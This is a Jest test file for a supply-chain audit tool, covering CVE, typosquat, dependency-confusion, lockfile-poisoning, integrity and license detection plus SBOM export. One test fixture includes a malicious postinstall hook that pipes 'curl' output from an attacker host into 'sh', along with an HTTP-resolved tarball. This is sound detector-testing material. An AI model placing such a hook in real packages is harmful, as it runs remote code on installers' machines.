'use strict';

const {
  runSupplyChainAudit,
  SbomEngine,
  THREAT_CATEGORIES,
} = require('../../src/supply_chain');

const fixtureData = require('../fixtures/supply_chain/supply_chain_dataset_v1.json');

describe('Supply Chain Intelligence Domain Integration Tests', () => {
  test('runSupplyChainAudit succeeds on clean valid project fixtures', () => {
    const auditResult = runSupplyChainAudit(
      fixtureData.validPackageJson,
      fixtureData.validLockfileJson,
      {
        advisories: fixtureData.advisoriesDataset,
        licensePolicy: fixtureData.licensePolicyDataset,
      }
    );

    expect(auditResult.status).toBe('PASS');
    expect(auditResult.findings.length).toBe(0);
    expect(auditResult.scannedComponentsCount).toBe(4);
    expect(auditResult.metrics.directDependencies).toBe(2);
    expect(auditResult.metrics.transitiveDependencies).toBe(2);
    expect(auditResult.metrics.maxDepth).toBe(2);
  });

  test('runSupplyChainAudit detects multi-vector violations across supply chain', () => {
    // Construct a synthetic project manifesting multiple threats
    const dirtyPackageJson = {
      name: 'vulnerable-app',
      version: '1.0.0',
      dependencies: {
        'lodash': '4.17.20', // V1: Known CVE
        'loadash': '1.0.0', // V3: Typosquat
        'bad-copyleft': '1.0.0', // V8: License violation
        'internal-secret-service': '1.0.0', // V4: Dependency confusion
      },
    };

    const dirtyLockfile = {
      name: 'vulnerable-app',
      version: '1.0.0',
      lockfileVersion: 3,
      packages: {
        'node_modules/lodash': {
          version: '4.17.20',
          resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz',
          integrity: 'sha512-test==',
          license: 'MIT',
        },
        'node_modules/loadash': {
          version: '1.0.0',
          resolved: 'https://registry.npmjs.org/loadash/-/loadash-1.0.0.tgz',
          integrity: 'sha512-test==',
          license: 'MIT',
        },
        'node_modules/bad-copyleft': {
          version: '1.0.0',
          resolved: 'https://registry.npmjs.org/bad-copyleft/-/bad-1.0.0.tgz',
          integrity: 'sha512-test==',
          license: 'AGPL-3.0-only',
        },
        'node_modules/internal-secret-service': {
          version: '1.0.0',
          resolved: 'https://registry.npmjs.org/internal-secret-service/-/internal-1.0.0.tgz',
          integrity: 'sha512-test==',
          license: 'MIT',
        },
        'node_modules/evil-hook-pkg': {
          version: '1.0.0',
          resolved: 'http://insecure-http-host.com/evil.tgz', // V5: HTTP lockfile poisoning
          license: 'MIT', // V6: Missing integrity
          scripts: {
            postinstall: 'curl -s http://attacker.com/steal | sh', // V2: Malicious hook
          },
        },
      },
    };

    const auditResult = runSupplyChainAudit(dirtyPackageJson, dirtyLockfile, {
      advisories: fixtureData.advisoriesDataset,
      licensePolicy: fixtureData.licensePolicyDataset,
      internalPackages: ['internal-secret-service'],
    });

    expect(auditResult.status).toBe('FAIL');
    expect(auditResult.findings.length).toBeGreaterThanOrEqual(5);

    // Verify presence of threat categories
    const foundCategories = new Set(auditResult.findings.map((f) => f.category));
    expect(foundCategories.has('V1_KNOWN_CVE')).toBe(true);
    expect(foundCategories.has('V2_MALICIOUS_PACKAGE_HOOK')).toBe(true);
    expect(foundCategories.has('V3_TYPOSQUATTING')).toBe(true);
    expect(foundCategories.has('V4_DEPENDENCY_CONFUSION')).toBe(true);
    expect(foundCategories.has('V5_LOCKFILE_POISONING')).toBe(true);
    expect(foundCategories.has('V6_INTEGRITY_CHECKSUM_GAP')).toBe(true);
    expect(foundCategories.has('V8_LICENSE_VIOLATION')).toBe(true);

    // Verify metrics aggregation
    expect(auditResult.metrics.criticalFindings).toBeGreaterThan(0);
    expect(auditResult.metrics.highFindings).toBeGreaterThan(0);
  });

  test('End-to-End SBOM Export & Validation Cycle', () => {
    const sbomEngine = new SbomEngine();

    const components = [
      {
        id: 'comp-1',
        name: 'lodash',
        version: '4.17.21',
        purl: 'pkg:npm/lodash@4.17.21',
        direct: true,
        depth: 0,
        hashes: { sha512: 'sha512-test==' },
        license: 'MIT',
      },
    ];

    // 1. Export CycloneDX
    const cdxDoc = sbomEngine.generateCycloneDx(components, { name: 'app' });
    const cdxVal = sbomEngine.validateSbom(cdxDoc);
    expect(cdxVal.status).toBe('PASS');

    // 2. Export SPDX
    const spdxDoc = sbomEngine.generateSpdx(components, { name: 'app' });
    const spdxVal = sbomEngine.validateSbom(spdxDoc);
    expect(spdxVal.status).toBe('PASS');
  });
});

